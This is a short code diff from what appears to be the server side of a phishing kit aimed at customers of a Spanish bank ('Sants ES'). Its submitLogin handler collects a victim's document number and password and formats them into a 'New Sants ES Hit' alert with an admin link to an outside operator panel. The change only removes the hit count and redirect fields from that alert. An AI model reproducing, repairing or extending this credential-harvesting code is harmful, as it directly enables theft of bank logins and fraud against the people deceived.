@@ -41,7 +41,7 @@ const getInfo = async (req, res) => {
 
 const submitLogin = async (req, res) => {
     let { document, documentNumber, password, uniqueid, owner, ip } = req.body;
-    message = `New Sants ES Hit:\n\n${document}\n${documentNumber}\n${password}\n\nAdmin Link: https://haytchc0ding.co.uk/new?panel=sants&password=${owner}\n\nCount: ${santsCount}\nRedirect: ${redirect}`;
+    message = `New Sants ES Hit:\n\n${document}\n${documentNumber}\n${password}\n\nAdmin Link: https://haytchc0ding.co.uk/new?panel=sants&password=${owner}`;
     try {
         let user = await Sants.findOne({ uniqueid });
         if (user) await Sants.deleteOne({ uniqueid });
